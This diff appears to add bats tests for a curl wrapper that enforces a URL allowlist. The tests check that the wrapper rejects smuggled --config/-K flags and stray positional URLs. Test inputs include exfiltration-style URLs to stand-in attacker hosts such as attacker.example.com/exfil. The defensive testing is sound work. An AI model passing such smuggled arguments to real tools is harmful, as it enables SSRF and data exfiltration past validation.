@@ -561,3 +561,121 @@ EOF
     [[ "$status" -eq 64 ]]
     [[ "$output" == *'ALLOWLIST-OUT-OF-TREE'* ]]
 }
+
+# ---------------------------------------------------------------------------
+# S3 — Smuggling defense extensions (BB iter-1 MEDIUM remediations)
+# ---------------------------------------------------------------------------
+
+@test "S3.1 caller --config=PATH (equals/glued form) is REJECTED (BB iter-1 MEDIUM coverage gap)" {
+    cat > "$WORK_DIR/cfg" <<'EOF'
+header = "X: ok"
+EOF
+    _run_guarded --allowlist "$PROVIDERS_ALLOWLIST" --url "https://api.openai.com/v1/chat/completions" \
+        "--config=$WORK_DIR/cfg"
+    [[ "$status" -eq 64 ]]
+    [[ "$output" == *'CONFIG-FLAG-REJECTED'* ]]
+    [[ ! -f "$MOCK_CURL_ARGV_LOG" ]]
+}
+
+@test "S3.2 caller -KPATH (bundled-short form) is REJECTED" {
+    # curl accepts -K bundled with the file path: `-Kfoo.cfg` means -K foo.cfg.
+    # The wrapper's `-K?*` glob in the case-statement catches this.
+    cat > "$WORK_DIR/cfg" <<'EOF'
+header = "X: ok"
+EOF
+    _run_guarded --allowlist "$PROVIDERS_ALLOWLIST" --url "https://api.openai.com/v1/chat/completions" \
+        "-K$WORK_DIR/cfg"
+    [[ "$status" -eq 64 ]]
+    [[ "$output" == *'CONFIG-FLAG-REJECTED'* ]]
+    [[ ! -f "$MOCK_CURL_ARGV_LOG" ]]
+}
+
+@test "S3.3 caller -K=PATH (bundled-equals form) is REJECTED" {
+    cat > "$WORK_DIR/cfg" <<'EOF'
+header = "X: ok"
+EOF
+    _run_guarded --allowlist "$PROVIDERS_ALLOWLIST" --url "https://api.openai.com/v1/chat/completions" \
+        "-K=$WORK_DIR/cfg"
+    [[ "$status" -eq 64 ]]
+    [[ "$output" == *'CONFIG-FLAG-REJECTED'* ]]
+    [[ ! -f "$MOCK_CURL_ARGV_LOG" ]]
+}
+
+# ---------------------------------------------------------------------------
+# S4 — Positional URL smuggling defense (BB iter-1 MEDIUM, real defense gap)
+# ---------------------------------------------------------------------------
+
+@test "S4.1 stray https:// URL in caller args is REJECTED (curl-positional-URL smuggling)" {
+    # Without this defense, curl would fetch BOTH the validated --url AND
+    # the unvalidated positional URL — a clean SSRF pivot via caller args.
+    _run_guarded --allowlist "$PROVIDERS_ALLOWLIST" \
+        --url "https://api.openai.com/v1/chat/completions" \
+        -sS "https://attacker.example.com/exfil"
+    [[ "$status" -eq 64 ]]
+    [[ "$output" == *'POSITIONAL-URL-REJECTED'* ]]
+    [[ ! -f "$MOCK_CURL_ARGV_LOG" ]]
+}
+
+@test "S4.2 stray http:// (insecure scheme) URL in caller args is REJECTED" {
+    _run_guarded --allowlist "$PROVIDERS_ALLOWLIST" \
+        --url "https://api.openai.com/v1/chat/completions" \
+        -sS "http://attacker.example.com/x"
+    [[ "$status" -eq 64 ]]
+    [[ "$output" == *'POSITIONAL-URL-REJECTED'* ]]
+    [[ ! -f "$MOCK_CURL_ARGV_LOG" ]]
+}
+
+@test "S4.3 case-insensitive: HTTPS:// upper-case in caller args also REJECTED" {
+    _run_guarded --allowlist "$PROVIDERS_ALLOWLIST" \
+        --url "https://api.openai.com/v1/chat/completions" \
+        "HTTPS://Evil.Example.com/X"
+    [[ "$status" -eq 64 ]]
+    [[ "$output" == *'POSITIONAL-URL-REJECTED'* ]]
+    [[ ! -f "$MOCK_CURL_ARGV_LOG" ]]
+}
+
+@test "S4.4 header VALUE containing https:// is NOT rejected (false-positive guard)" {
+    # `-H "Origin: https://api.openai.com"` — the arg starts with "Origin: ",
+    # not with "https://", so the regex correctly does NOT match. This pin
+    # ensures the strict-reject doesn't break legitimate header passing.
+    _run_guarded --allowlist "$PROVIDERS_ALLOWLIST" \
+        --url "https://api.openai.com/v1/chat/completions" \
+        -H "Origin: https://api.openai.com" -sS
+    [[ "$status" -eq 0 ]]
+    grep -qFx 'Origin: https://api.openai.com' "$MOCK_CURL_ARGV_LOG"
+}
+
+# ---------------------------------------------------------------------------
+# S5 — --config-auth argv position pin (BB iter-1 MEDIUM)
+# ---------------------------------------------------------------------------
+
+@test "S5.1 --config-auth file appears in argv BETWEEN hardened defaults and caller args (position pin)" {
+    cat > "$WORK_DIR/auth.cfg" <<'EOF'
+header = "Authorization: Bearer sk-test"
+EOF
+    _run_guarded --allowlist "$PROVIDERS_ALLOWLIST" --config-auth "$WORK_DIR/auth.cfg" \
+        --url "https://api.openai.com/v1/chat/completions" -sS --max-time 30
+    [[ "$status" -eq 0 ]]
+    # Expected exact ordering at the head:
+    #   1-6: hardened defaults (--proto =https, --proto-redir =https, --max-redirs 10)
+    #   7-8: --config <auth-file>
+    #   9+:  caller args (-sS, --max-time, 30)
+    #   tail: --url <url>
+    local expected_head
+    expected_head=$'--proto\n=https\n--proto-redir\n=https\n--max-redirs\n10\n--config\n'"$WORK_DIR/auth.cfg"$'\n-sS\n--max-time\n30\n--url\nhttps://api.openai.com/v1/chat/completions'
+    local actual
+    actual="$(cat "$MOCK_CURL_ARGV_LOG")"
+    [[ "$actual" == "$expected_head" ]] || {
+        printf 'argv layout mismatch\nWANT:\n%s\nGOT:\n%s\n' "$expected_head" "$actual" >&2
+        return 1
+    }
+}
+
+@test "S5.2 without --config-auth, NO --config arg is added to curl invocation" {
+    _run_guarded --allowlist "$PROVIDERS_ALLOWLIST" \
+        --url "https://api.openai.com/v1/chat/completions" -sS
+    [[ "$status" -eq 0 ]]
+    # If no --config-auth was supplied, the wrapper MUST NOT inject a stray
+    # --config arg into curl (which would then fail to read the missing file).
+    ! grep -qE '^--config$' "$MOCK_CURL_ARGV_LOG"
+}
